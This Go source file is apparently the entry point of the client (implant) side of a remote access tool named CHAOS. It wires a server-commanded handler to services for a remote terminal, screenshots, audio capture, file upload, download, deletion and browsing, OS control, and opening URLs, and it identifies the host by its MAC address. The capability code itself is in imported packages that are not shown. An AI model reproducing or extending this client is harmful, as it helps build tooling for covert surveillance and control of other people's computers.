package app

import (
	"github.com/justadoll/CHAOS/client/app/gateway/client"
	"github.com/justadoll/CHAOS/client/app/handler"
	"github.com/justadoll/CHAOS/client/app/services"
	"github.com/justadoll/CHAOS/client/app/services/audio"
	"github.com/justadoll/CHAOS/client/app/services/delete"
	"github.com/justadoll/CHAOS/client/app/services/download"
	"github.com/justadoll/CHAOS/client/app/services/explorer"
	"github.com/justadoll/CHAOS/client/app/services/information"
	"github.com/justadoll/CHAOS/client/app/services/os"
	"github.com/justadoll/CHAOS/client/app/services/screenshot"
	"github.com/justadoll/CHAOS/client/app/services/terminal"
	"github.com/justadoll/CHAOS/client/app/services/upload"
	"github.com/justadoll/CHAOS/client/app/services/url"
	"github.com/justadoll/CHAOS/client/app/shared/environment"
	"github.com/justadoll/CHAOS/client/app/utilities/system"
	"net/http"
)

type App struct {
	Handler *handler.Handler
}

func NewApp(httpClient *http.Client, configuration *environment.Configuration) *App {
	osType := system.DetectOS()
	clientGateway := client.NewGateway(configuration, httpClient)

	informationService := information.NewInformationService(configuration.Server.Port)
	terminalService := terminal.NewTerminalService()
	appServices := &services.Services{
		Information: informationService,
		Terminal:    terminalService,
		Screenshot:  screenshot.NewScreenshotService(),
		Download:    download.NewDownloadService(configuration, clientGateway),
		Upload:      upload.NewUploadService(configuration, httpClient),
		Delete:      delete.NewDeleteService(),
		Explorer:    explorer.NewExplorerService(),
		OS:          os.NewOperatingSystemService(configuration, terminalService, osType),
		URL:         url.NewURLService(terminalService, osType),
		Audio:		audio.NewAudioService(),
	}

	deviceSpecs, err := informationService.LoadDeviceSpecs()
	if err != nil {
		panic(err)
	}

	return &App{handler.NewHandler(
		configuration, clientGateway, appServices, deviceSpecs.MacAddress)}
}

func (a *App) Run() {
	go a.Handler.HandleServer()
	a.Handler.HandleCommand()
}
